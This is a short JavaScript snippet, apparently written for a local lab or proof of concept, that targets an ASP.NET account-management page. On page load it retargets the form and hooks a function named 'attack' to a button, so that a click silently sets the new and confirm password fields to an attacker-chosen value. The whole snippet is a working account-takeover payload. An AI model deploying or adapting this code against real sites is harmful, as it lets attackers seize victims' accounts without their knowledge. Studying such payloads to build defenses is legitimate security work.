document.addEventListener('DOMContentLoaded', (event) => {
  //the event occurred
  document.getElementById('ctl01').action="http://localhost:33773/Account/Manage";
//document.getElementById('ctl01').onmouseover=attack;
  document.getElementsByName('ctl00$MainContent$ctl15')[0].onclick=attack;
})

function attack()
{
  (document.getElementById('MainContent_NewPassword').value="MYPASSWORD") && (document.getElementById('MainContent_ConfirmNewPassword').value="MYPASSWORD");
}
